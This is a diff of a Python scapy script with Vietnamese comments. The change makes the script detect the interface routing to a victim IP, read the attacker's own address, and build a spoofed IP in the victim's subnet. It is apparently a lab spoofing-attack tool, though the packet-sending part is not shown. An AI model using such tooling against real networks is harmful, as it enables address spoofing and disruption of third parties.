@@ -5,17 +5,35 @@ import sys
 import time
 from scapy.all import *
 
-victim_ip   = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
-attacker_ip = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.1"
-iface       = sys.argv[3] if len(sys.argv) > 3 else (conf.iface or "eth0")
+victim_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
 
-# Neu nguoi dung muon chi dinh IP gia mao
+# Tu dong phat hien card mang phu hop huong toi victim_ip
+try:
+    auto_iface = conf.route.route(victim_ip)[0]
+except Exception:
+    auto_iface = conf.iface or "eth0"
+iface = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3] != "auto" else auto_iface
+
+# Tu dong lay IP that cua Attacker tren card mang dang ket noi
+my_ip = get_if_addr(iface) or "10.0.0.1"
+
+if len(sys.argv) > 2 and sys.argv[2] != "auto":
+    attacker_ip = sys.argv[2]
+else:
+    if victim_ip != "10.0.0.2":
+        attacker_ip = my_ip
+    else:
+        attacker_ip = "10.0.0.1"
+
+# Tu dong tao IP gia mao cung subnet voi victim_ip (ho tro moi dai mang 10.x, 172.x, 192.168.x)
 if len(sys.argv) > 4:
     spoof_ip = sys.argv[4]
 else:
-    if victim_ip.startswith("192.168."):
+    if victim_ip != "10.0.0.2":
         prefix = ".".join(victim_ip.split(".")[:3])
-        spoof_ip = f"{prefix}.222"
+        last_octet = victim_ip.split(".")[-1]
+        spoof_host = "223" if last_octet == "222" else "222"
+        spoof_ip = f"{prefix}.{spoof_host}"
     else:
         spoof_ip = "10.0.0.77"
 
